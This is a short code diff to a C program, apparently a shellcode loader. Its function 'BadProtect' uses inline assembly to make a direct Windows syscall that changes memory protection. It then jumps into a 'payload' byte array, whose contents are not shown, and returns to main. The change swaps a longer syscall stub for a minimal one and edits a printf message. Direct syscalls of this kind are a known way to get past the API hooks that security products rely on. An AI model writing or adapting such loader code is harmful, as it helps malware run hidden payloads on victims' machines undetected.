@@ -18,6 +18,12 @@ BYTE payload[] =
 
 // BadProtect
 NTSTATUS BadProtect(HANDLE ProcessHandle, PVOID * BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect){
+	asm("mov rax,0x50;"
+		"mov r10, rcx;"
+		"syscall;"
+		"jmp return_main;");
+		
+	/* // Original syscall stub //
 	asm("mov [rsp+ 8], rcx;"
 		"mov [rsp+16], rdx;"
 		"mov [rsp+24], r8;"
@@ -32,6 +38,8 @@ NTSTATUS BadProtect(HANDLE ProcessHandle, PVOID * BaseAddress, PSIZE_T RegionSiz
 		"mov r10, rcx;"
 		"syscall;"
 		"jmp return_main;");
+		// End of original syscall stuff */
+		
 	NTSTATUS ret = 0;
 	return ret;	
 }
@@ -69,8 +77,7 @@ int main(){
 	// Payload returns here
 	asm("return_main_2:");
 	
-	printf("Hey there GhostPepper!\n");
+	printf("Sayonara!\n");
 	
 	return 0;
 }
-
